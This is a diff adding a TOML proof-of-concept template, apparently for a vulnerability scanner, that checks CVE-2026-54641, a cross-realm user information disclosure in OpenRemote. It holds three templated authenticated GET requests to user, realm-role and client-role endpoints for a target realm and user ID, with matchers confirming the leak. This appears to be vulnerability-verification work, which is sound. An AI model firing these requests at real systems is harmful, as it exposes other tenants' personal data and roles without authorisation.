@@ -1,0 +1,70 @@
+[info]
+author = "AVE"
+description = "验证 OpenRemote UserResourceImpl 跨域用户信息泄露漏洞。已认证的租户域管理员可通过构造包含其他域用户 UUID 的 API 请求，越权读取跨租户用户的个人资料、客户端角色和域角色信息。"
+id = "POC-AVE-2026-0583"
+name = "CVE-2026-54641 OpenRemote Cross-Realm User Information Disclosure PoC"
+severity = "high"
+tags = [
+    "cve-2026-54641",
+    "openremote",
+    "information-disclosure",
+    "authorization-bypass",
+]
+vuln_id = [
+    "CVE-2026-54641",
+    "AVE-2026-0583",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/{{tenant}}/user/{{target_realm}}/{{target_user_id}}"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "realm",
+    "username",
+    "firstName",
+    "lastName",
+    "enabled",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/{{tenant}}/user/{{target_realm}}/userRealmRoles/{{target_user_id}}"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["admin"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/{{tenant}}/user/{{target_realm}}/userRoles/{{target_user_id}}/openremote"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "read:admin",
+    "write:admin",
+]
